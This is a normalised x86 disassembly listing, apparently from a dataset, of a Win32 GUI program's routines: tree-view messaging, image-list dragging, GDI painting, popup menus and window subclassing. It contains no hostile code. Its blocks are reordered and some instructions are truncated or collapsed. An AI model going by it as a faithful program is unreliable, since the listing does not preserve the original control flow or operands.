shr ecx 0x1
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx eax
jae r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x2
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
call sub_448080
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_420d50
add esp 0x10
lea eax [ ebp + 0x10 ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ edx * 4 ]
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_448080
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
push edx
mov edx ecx
sub edx edi
sar edx 0x2
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_461a40
mov ebx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ebx ecx
lea eax [ ebp + 0x10 ]
mov [ esi + 0x8 ] ebx
push eax
mov esi ebx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add eax ecx
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_4b2200
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
shl eax 0x2
push eax
mov [ ebp - 0x14 ] eax
call sub_4b573e
mov edx [ ebp + 0xc ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_453050
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp + 0x10 ]
push ecx
push edx
push edi
call sub_420d80
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + eax * 4 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx ebx
lea eax [ ebx + edi * 4 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add eax edx
sub_41d110
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
cmp eax edx
jae r-xdata
pop edi
pop esi
retn 0x8
mov edi [ ecx + 0x8 ]
mov eax edi
sub eax esi
sar eax 0x2
cmp edx eax
jae r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
push ecx
mov eax esp
mov [ eax ] edi
mov eax [ ecx + 0x4 ]
push ecx
lea eax [ eax + edx * 4 ]
mov esi esp
lea edx [ esp + 0x14 ]
push edx
mov [ esi ] eax
call sub_420e40
sub edx eax
lea esi [ esp + 0x10 ]
push esi
push edx
mov edx [ ecx + 0x8 ]
push ecx
mov eax esp
mov [ eax ] edx
call sub_41ce70
pop edi
pop esi
retn 0x8
sub_41d190
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_41ce70
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_41d200
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfb06
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x3ec
push ebx
push ebp
xor ebx ebx
cmp eax ebx
push esi
push edi
je r-xdata
mov ecx [ esp + 0x3fc ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x3f8
retn
mov edi 0xffff0000
push edi
push ebx
push 0x1101
push eax
mov [ rw-data ] edi
call [ SendMessageA@IAT ]
cmp [ esp + 0x40c ] ebx
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x248 ] 0x10
jb r-xdata
lea esi [ eax + 0x234 ]
mov esi [ eax + 0x234 ]
jmp r-xdata
mov eax [ esp + 0x30 ]
cmp eax ebx
je r-xdata
lea esp [ esp ]
mov ebp esi
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x408 ] ebx
mov [ esp + 0x14 ] edi
call sub_41d190
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
cmp [ esi ] 0x0
mov [ esp + 0x404 ] 0x1
mov [ esp + 0x14 ] 0x1
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x1c ]
cmp eax ebx
je r-xdata
cmp al 0x3a
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + esi + 0x42 ] 0x0
cmp al 0x2f
je r-xdata
cmp esi 0x6
jge r-xdata
inc ebp
mov [ esp + esi + 0x42 ] al
inc esi
cmp esi 0x1f
jl r-xdata
lea ecx [ esp + 0x42 ]
push ecx
call j_sub_4b692d
add esp 0x4
cmp esi 0x6
mov edi eax
lea ebx [ esp + 0x42 ]
jge r-xdata
mov eax 0x6
lea ecx [ esp + 0x41 ]
sub eax esi
mov al [ ebp ]
test al al
je r-xdata
jmp r-xdata
mov al [ ebp ]
xor esi esi
cmp al 0x2f
jne r-xdata
lea ebx [ esp + esi + 0x3c ]
mov [ ecx ] 0x20
dec ecx
dec eax
jne r-xdata
cmp esi 0x1f
je r-xdata
inc ebp
lea esp [ esp ]
mov eax [ rw-data ]
test eax eax
mov [ esp + ecx + 0xf0 ] 0x0
je r-xdata
lea esp [ esp ]
mov al [ ebp ]
xor ecx ecx
test al al
je r-xdata
cmp al 0x3a
je r-xdata
mov esi [ lstrcatA@IAT ]
lea ecx [ esp + 0xf0 ]
push ecx
lea edx [ esp + 0x1f8 ]
push edx
call esi
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ esp + 0xb0 ] 0x0
xor esi esi
lea ecx [ ecx ]
cmp al 0x3c
je r-xdata
mov [ esp + ecx + 0x90 ] 0x0
cmp al 0x2f
je r-xdata
push 0x28
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
push r--data
lea eax [ esp + 0x1f8 ]
push eax
call esi
push ebx
lea ecx [ esp + 0x1f8 ]
push ecx
call esi
mov eax [ esp + 0x20 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
cmp al 0x3e
je r-xdata
test esi esi
jne r-xdata
inc ebp
mov [ esp + ecx + 0x90 ] al
inc ecx
cmp ecx 0x40
jl r-xdata
xor esi esi
xor ebx ebx
xor ebx ebx
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] ebx
mov [ eax + 0x4 ] bl
mov esi eax
jmp r-xdata
mov edx [ esp + 0x14 ]
push edx
push eax
lea ecx [ esp + 0xb8 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ rw-data ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ ecx + esi * 4 ]
push edx
push eax
lea ecx [ esp + 0xb8 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0x10
inc esi
jmp r-xdata
cmp esi eax
lea eax [ esp + 0xb0 ]
jge r-xdata
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
lea eax [ esp + 0x90 ]
push eax
call j_sub_4b692d
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x90 ]
push edx
call j_sub_4b692d
mov [ esp + 0x2c ] eax
jmp r-xdata
mov al [ ebp ]
test al al
je r-xdata
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea edx [ esp + 0xf4 ]
push edx
mov ecx esi
call sub_401e80
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x24 ] ecx
mov [ esi + 0x1c ] edi
mov edi [ esp + 0x34 ]
mov [ esi + 0x20 ] eax
lea ecx [ esp + 0x5c ]
push ecx
mov [ esp + 0x64 ] 0xffff0002
mov [ esp + 0x68 ] 0x37
mov edx [ edi - 0x4 ]
push ebx
mov [ esp + 0x64 ] edx
mov edx [ rw-data ]
push 0x1100
lea eax [ esp + 0x200 ]
push edx
mov [ esp + 0x84 ] eax
mov [ esp + 0x88 ] 0x1cc
mov [ esp + 0x98 ] esi
mov [ esp + 0x8c ] ebx
mov [ esp + 0x90 ] 0x1
call [ SendMessageA@IAT ]
mov [ esp + 0x10 ] eax
mov al [ ebp ]
cmp al 0x3c
jne r-xdata
lea eax [ esp + 0xf0 ]
lea ecx [ eax + 0x1 ]
lea edx [ esp + 0xb0 ]
push edx
lea eax [ esp + 0x1f8 ]
push eax
call [ lstrcatA@IAT ]
mov ecx [ esp + 0x1c ]
test ecx ecx
jne r-xdata
cmp al 0x5c
jne r-xdata
mov [ esp + ecx + 0xf0 ] al
inc ecx
jmp r-xdata
inc ebp
xor ecx ecx
mov al [ ebp ]
add esp 0x4
inc esi
cmp al 0x2f
je r-xdata
cmp ecx 0x1f
je r-xdata
cmp al 0x3e
jne r-xdata
mov edx [ esp + 0x30 ]
cmp edx ebx
je r-xdata
mov al [ ebp ]
mov [ esp + ecx + 0xf0 ] al
mov al [ ebp + 0x1 ]
inc ecx
inc ebp
test al al
jne r-xdata
mov al [ ebp + 0x1 ]
cmp al 0x7c
je r-xdata
inc ebp
cmp [ ebp ] 0x7c
jne r-xdata
mov esi [ esp + 0x30 ]
mov [ esp + 0x10 ] ebx
mov ebx [ esp + 0x1c ]
lea eax [ esp + 0x10 ]
push eax
push 0x1
push ecx
mov eax esp
lea ecx [ esp + 0x38 ]
mov [ eax ] edi
call sub_41ce70
mov ecx [ esp + 0x38 ]
mov eax edi
sub eax edx
sub ecx edx
sar eax 0x2
sar ecx 0x2
cmp eax ecx
jae r-xdata
cmp al 0x7c
je r-xdata
cmp al 0x3c
je r-xdata
mov ecx [ esp + 0x14 ]
mov al [ ebp ]
inc ecx
xor ebx ebx
test al al
mov [ esp + 0x14 ] ecx
jne r-xdata
inc ebp
mov eax edi
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
lea ecx [ esp + 0x14 ]
push ecx
push 0x1
push ecx
mov eax esp
lea ecx [ esp + 0x24 ]
mov [ eax ] esi
call sub_41ce70
inc ebp
mov [ esp + 0x14 ] ebx
jmp r-xdata
mov ecx [ esp + 0x24 ]
mov eax esi
sub eax edx
sub ecx edx
sar eax 0x2
sar ecx 0x2
cmp eax ecx
jae r-xdata
mov eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esp + 0x34 ] edi
jmp r-xdata
cmp al 0x3e
je r-xdata
mov [ esp + 0x28 ] ebx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x1f4 ] 0x0
xor esi esi
mov ecx edi
sub ecx esi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
dec eax
test esi esi
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
lea eax [ esp + 0x1c ]
push eax
push 0x1
push esi
call sub_420d80
add esi 0x4
add esp 0x14
mov [ esp + 0x20 ] esi
inc ebp
mov [ esp + 0x14 ] ebx
jmp r-xdata
mov edx [ esp + 0x1c ]
cmp edx ebx
mov esi [ esp + 0x20 ]
je r-xdata
cmp al 0x5c
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
cmp ecx eax
jae r-xdata
mov ecx edi
sub ecx esi
sar ecx 0x2
cmp eax ecx
jae r-xdata
mov ecx edi
sub ecx esi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test esi esi
je r-xdata
lea eax [ esi + eax * 4 ]
cmp eax edi
je r-xdata
lea edx [ esp + 0x10 ]
sub eax ecx
push edx
push eax
push ecx
mov eax esp
lea ecx [ esp + 0x38 ]
mov [ eax ] edi
call sub_41ce70
mov edi [ esp + 0x34 ]
mov esi [ esp + 0x30 ]
jmp r-xdata
mov eax edi
sub eax esi
sar eax 0x2
test eax eax
je r-xdata
mov edi eax
mov [ esp + 0x34 ] edi
test ebx ebx
mov edx [ esp + 0x20 ]
mov eax [ edx - 0x4 ]
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax edx
sub eax ebx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx edx
sub ecx ebx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
dec eax
test ebx ebx
mov [ esp + 0x28 ] 0x0
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
cmp ecx eax
jae r-xdata
mov al [ ebp + 0x1 ]
inc ebp
cmp al 0x3e
je r-xdata
mov ecx edx
sub ecx ebx
sar ecx 0x2
cmp eax ecx
jae r-xdata
mov ecx edx
sub ecx ebx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test esi esi
jne r-xdata
lea eax [ ebx + eax * 4 ]
cmp eax edx
je r-xdata
sub eax ecx
lea edx [ esp + 0x28 ]
push edx
push eax
push ecx
mov ecx [ esp + 0x2c ]
mov eax esp
mov [ eax ] ecx
lea ecx [ esp + 0x24 ]
call sub_41ce70
mov ebx [ esp + 0x1c ]
jmp r-xdata
mov [ esp + 0x20 ] eax
sub_41d7f0
mov ecx [ esp + 0x8 ]
sub esp 0x1fc
cmp ecx 0x4e
push ebx
mov ebx [ esp + 0x210 ]
push ebp
mov ebp [ esp + 0x208 ]
push esi
push edi
ja r-xdata
lea eax [ ecx - 0x200 ]
cmp eax 0xa
ja r-xdata
je r-xdata
mov edx [ esp + 0x21c ]
mov eax [ esp + 0x218 ]
mov ecx [ esp + 0x214 ]
push edx
push eax
push ecx
push ebp
call [ DefWindowProcA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
movzx edx [ eax + lookup_table_41eaa4 ]
jmp [ edx * 4 + jump_table_41ea90 ]
mov esi [ esp + 0x21c ]
mov eax [ esi + 0x4 ]
mov ebx 0x1
cmp eax ebx
jne r-xdata
lea eax [ ecx - 0x1 ]
cmp eax 0xe
ja r-xdata
mov eax [ esp + 0x218 ]
push ebx
push eax
push ecx
mov ecx [ rw-data ]
push ecx
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov al [ rw-data ]
movzx edi bx
shr ebx 0x10
test al al
je r-xdata
mov dl [ rw-data ]
movzx ecx bx
mov eax ebx
shr eax 0x10
test dl dl
mov [ esp + 0x30 ] ecx
mov [ esp + 0x18 ] eax
je r-xdata
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov eax [ esi + 0x8 ]
cmp eax 0xfffffe6e
ja r-xdata
movzx eax [ eax + lookup_table_41e9e0 ]
jmp [ eax * 4 + jump_table_41e9cc ]
lea eax [ eax + eax * 4 - 0x5 ]
shl eax 0x3
push 0x0
lea edx [ esp + 0x3c ]
mov [ esp + 0x3c ] eax
push edx
add eax 0x28
push ebp
mov [ esp + 0x48 ] 0x1
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] 0x13
call [ InvalidateRect@IAT ]
push ebp
call [ UpdateWindow@IAT ]
push ebp
call [ SetCapture@IAT ]
jmp r-xdata
xor esi esi
mov ebp 0x1
mov edi edi
call [ ReleaseCapture@IAT ]
mov eax [ rw-data ]
push eax
mov [ rw-data ] 0x0
call [ ImageList_DragLeave@IAT ]
call [ ImageList_EndDrag@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ esp + 0x30 ]
xor bl bl
xor edi edi
mov [ esp + 0x10 ] ecx
lea ecx [ esp + 0x10 ]
push ecx
push ebp
mov [ esp + 0x1c ] eax
call [ ClientToScreen@IAT ]
mov eax [ rw-data ]
lea edx [ esp + 0x10 ]
push edx
push eax
call [ ScreenToClient@IAT ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push ecx
push edx
call [ ImageList_DragMove@IAT ]
mov esi [ ImageList_DragShowNolock@IAT ]
push 0x0
call esi
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ SendMessageA@IAT ]
lea edx [ esp + 0x48 ]
push edx
push 0x0
mov [ esp + 0x50 ] eax
mov eax [ rw-data ]
push 0x1111
push eax
mov [ esp + 0x5c ] ecx
mov [ esp + 0x60 ] 0x46
call edi
mov ecx [ rw-data ]
push eax
push 0x8
push 0x110b
push ecx
call edi
push 0x1
call esi
jmp r-xdata
cmp eax 0xfffffffb
je r-xdata
je r-xdata
mov esi [ esp + 0x21c ]
mov ecx [ esi + 0x4 ]
mov ebp [ esp + 0x210 ]
push 0x0
push ecx
push 0x1
push ebp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x5000002d
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
test eax eax
mov ebx [ SendMessageA@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x21c ]
mov ecx [ rw-data ]
push 0x4
mov edx eax
shr edx 0x10
sub edx 0x14
push edx
movzx eax ax
push eax
push 0x14
push 0x0
push 0x0
push ecx
call [ SetWindowPos@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov edi [ esp + 0x210 ]
lea edx [ esp + 0xb4 ]
push edx
push edi
call [ BeginPaint@IAT ]
mov esi eax
lea eax [ esp + 0x48 ]
push eax
push edi
call [ GetClientRect@IAT ]
mov edi [ GetSysColor@IAT ]
push 0xf
call edi
push eax
call [ CreateSolidBrush@IAT ]
mov ebx [ SelectObject@IAT ]
mov ebp eax
push ebp
push esi
mov [ esp + 0x20 ] ebp
call ebx
push 0x14
mov [ esp + 0xa4 ] eax
call edi
push eax
push 0x1
push 0x0
call [ CreatePen@IAT ]
push 0x10
mov [ esp + 0x14 ] eax
call edi
push eax
push 0x1
xor edi edi
push edi
call [ CreatePen@IAT ]
mov ecx [ esp + 0x10 ]
push ecx
push esi
mov [ esp + 0x1c ] eax
call ebx
mov edx [ esp + 0x50 ]
mov [ esp + 0x5c ] eax
push ebp
lea eax [ esp + 0x3c ]
push eax
push esi
mov [ esp + 0x44 ] edi
mov [ esp + 0x48 ] 0x1
mov [ esp + 0x4c ] edx
mov [ esp + 0x50 ] 0x13
call [ FillRect@IAT ]
push 0x11
call [ GetStockObject@IAT ]
push eax
push esi
call ebx
push 0x1
push esi
mov [ esp + 0x60 ] eax
call [ SetBkMode@IAT ]
mov [ esp + 0xa4 ] r--data
mov [ esp + 0xa8 ] r--data
mov [ esp + 0xac ] r--data
mov [ esp + 0xb0 ] r--data
lea esp [ esp ]
inc esi
cmp esi 0x4
jl r-xdata
cmp edi ecx
jg r-xdata
mov ecx [ rw-data ]
mov esi [ SendMessageA@IAT ]
push 0x0
push 0x8
push 0x110a
push ecx
call esi
mov edx [ rw-data ]
push 0x0
push 0x9
push 0x110a
push edx
mov edi eax
call esi
mov ebx eax
cmp edi ebx
je r-xdata
push eax
call [ ImageList_Destroy@IAT ]
mov [ rw-data ] 0x0
inc edi
cmp edi 0x4
jl r-xdata
add ecx 0x27
cmp edx ecx
jg r-xdata
lea ecx [ esp + 0x10 ]
push ecx
call [ GetCursorPos@IAT ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x20 ]
mov [ esp + 0x20 ] edx
mov edx [ esi ]
push ecx
push edx
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x46
call [ ScreenToClient@IAT ]
mov ecx [ esi ]
mov ebp [ SendMessageA@IAT ]
lea eax [ esp + 0x20 ]
push eax
push 0x0
push 0x1111
push ecx
call ebp
test [ esp + 0x28 ] 0x4
je r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
add eax 0x19c
cmp eax 0x5
ja r-xdata
push 0x1
push 0x2
push 0x5
push 0x10
push 0x10
call [ ImageList_Create@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ LoadIconA@IAT ]
push 0x10a
push ecx
mov [ rw-data ] eax
call edi
mov edx [ rw-data ]
push eax
push 0xffffffff
push edx
call [ ImageList_ReplaceIcon@IAT ]
mov eax [ esi + 0x4 ]
push 0x10b
push eax
call edi
mov ecx [ rw-data ]
push eax
push 0xffffffff
push ecx
call [ ImageList_ReplaceIcon@IAT ]
mov edx [ rw-data ]
mov eax [ rw-data ]
push edx
push 0x0
push 0x1109
push eax
call ebx
mov ecx [ esi + 0x4 ]
push 0x0
push ecx
push 0x0
push ebp
push 0x80000000
push 0x80000000
push 0x80000000
push 0x80000000
push 0x1
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov [ rw-data ] eax
xor eax eax
mov ecx 0xb
lea edi [ esp + 0x60 ]
[ edi ]
mov [ esp + 0x68 ] ebp
xor esi esi
mov [ esp + 0x60 ] 0x2c
mov [ esp + 0x64 ] 0x10
mov ebp 0x1
xor edi edi
jmp r-xdata
push 0x0
push 0x1
push 0x0
push 0x0
push 0x0
push 0x80
push 0x0
push 0x0
push 0x0
push 0x190
push 0x0
push 0x0
push 0x0
push 0xc
call [ CreateFontA@IAT ]
mov edx [ rw-data ]
push 0x0
push eax
push 0x30
push edx
mov [ rw-data ] eax
call ebx
mov eax [ rw-data ]
push sub_41c520
push 0xfffffffc
push eax
call [ SetWindowLongA@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call [ DeleteObject@IAT ]
mov eax [ esp + edi * 4 + 0xa4 ]
lea ebp [ edi + edi * 4 ]
push eax
shl ebp 0x3
call [ lstrlenA@IAT ]
mov edx [ esp + 0x24 ]
push eax
mov eax [ esp + edi * 4 + 0xa8 ]
push eax
mov eax 0x14
sub eax edx
cdq
sub eax edx
mov edx [ esp + 0x24 ]
sar eax 0x1
add eax edx
mov edx [ esp + 0x28 ]
push eax
mov eax 0x28
sub eax edx
cdq
sub eax edx
sar eax 0x1
add eax ebp
push eax
push esi
call [ TextOutA@IAT ]
cmp edi 0x2
mov ecx [ rw-data ]
jge r-xdata
cmp [ rw-data ] eax
jne r-xdata
lea eax [ esi + esi * 4 ]
shl eax 0x3
cmp eax edi
lea ecx [ eax + 0x28 ]
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] ebp
mov [ esp + 0x40 ] ecx
mov [ esp + 0x44 ] 0x13
jg r-xdata
jmp r-xdata
cmp ebx ebp
jl r-xdata
mov eax [ rw-data ]
push edi
push 0x3
push 0x110a
push eax
call esi
test eax eax
je r-xdata
lea ecx [ edi + edi * 4 ]
shl ecx 0x3
mov eax edi
shl eax 0x4
lea esi [ ecx + 0x28 ]
mov [ esp + eax + 0x60 ] ecx
mov [ esp + eax + 0x64 ] 0x1
mov [ esp + eax + 0x68 ] esi
mov [ esp + eax + 0x6c ] 0x13
lea eax [ ecx + 0x1 ]
cmp eax edx
jg r-xdata
test bl bl
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax 0x1
jl r-xdata
mov edx [ esp + 0x2c ]
lea ecx [ esp + 0x60 ]
push ecx
push 0x0
mov [ esp + 0x6c ] edx
mov edx [ esi ]
push 0x110c
lea eax [ esp + 0x100 ]
push edx
mov [ esp + 0x70 ] 0x15
mov [ esp + 0x80 ] eax
mov [ esp + 0x84 ] 0x104
call ebp
test eax eax
je r-xdata
mov eax [ esi ]
push 0x0
push 0x9
push 0x110a
push eax
call [ SendMessageA@IAT ]
push eax
call sub_41c190
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov edx [ esi ]
push 0x0
push 0x9
push 0x110a
push edx
call [ SendMessageA@IAT ]
push eax
call sub_41c190
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
jmp [ eax * 4 + jump_table_41e9f0 ]
mov ecx [ rw-data ]
mov edx [ esi * 4 + rw-data ]
lea eax [ edi + 0x28 ]
mov [ esp + 0x78 ] eax
mov eax 0x13
mov [ esp + 0x7c ] eax
lea eax [ esp + 0x60 ]
push eax
push 0x0
push 0x404
push ecx
mov [ esp + 0x94 ] edx
mov [ esp + 0x7c ] esi
mov [ esp + 0x80 ] edi
mov [ esp + 0x84 ] ebp
call ebx
inc esi
add edi 0x28
cmp esi 0x4
jl r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call [ ImageList_Destroy@IAT ]
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x34 ]
jne r-xdata
mov [ esp + 0x1c ] 0x1
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call [ ReleaseCapture@IAT ]
mov ebp [ esp + 0x210 ]
jmp r-xdata
cmp ebx 0x13
jg r-xdata
test edi edi
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp eax 0x13
jg r-xdata
call [ CreatePopupMenu@IAT ]
mov ebx [ AppendMenuA@IAT ]
push r--data
push 0x1
mov edi eax
push 0x0
push edi
call ebx
push r--data
push 0x2
push 0x0
push edi
call ebx
push r--data
push 0x3
push 0x0
push edi
call ebx
push r--data
push 0x4
push 0x0
push edi
call ebx
push r--data
push 0x5
push 0x0
push edi
call ebx
mov eax [ esp + 0x210 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push 0x0
push eax
push 0x0
push ecx
push edx
push 0x100
push edi
call [ TrackPopupMenu@IAT ]
push edi
mov ebx eax
call [ DestroyMenu@IAT ]
mov eax [ esp + 0x2c ]
mov ecx [ esi ]
push eax
push 0x9
push 0x110b
push ecx
call ebp
cmp ebx 0x1
jne r-xdata
mov esi [ esi + 0x34 ]
test esi esi
je r-xdata
mov ecx [ esi ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x9
push 0x110a
push ecx
call edi
test eax eax
je r-xdata
mov ecx [ esi + 0x60 ]
mov edx [ esi + 0x64 ]
lea eax [ esp + 0x20 ]
mov [ esp + 0x20 ] ecx
mov ecx [ esi ]
push eax
push ecx
mov [ esp + 0x2c ] edx
call [ ClientToScreen@IAT ]
mov eax [ esi ]
lea edx [ esp + 0x20 ]
push edx
push eax
mov [ esp + 0x30 ] 0x46
call [ ScreenToClient@IAT ]
mov edx [ esi ]
mov edi [ SendMessageA@IAT ]
lea ecx [ esp + 0x20 ]
push ecx
push 0x0
push 0x1111
push edx
call edi
test [ esp + 0x28 ] 0x4
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov edi [ esi + 0x1c ]
xor ebp ebp
cmp edi ebp
mov [ esp + 0x18 ] edi
je r-xdata
mov edx [ rw-data ]
push edx
call sub_41d200
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov ecx [ rw-data ]
push ecx
push 0xfffffffc
push eax
call [ SetWindowLongA@IAT ]
cmp edi 0x3
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp edi 0x2
test ecx ecx
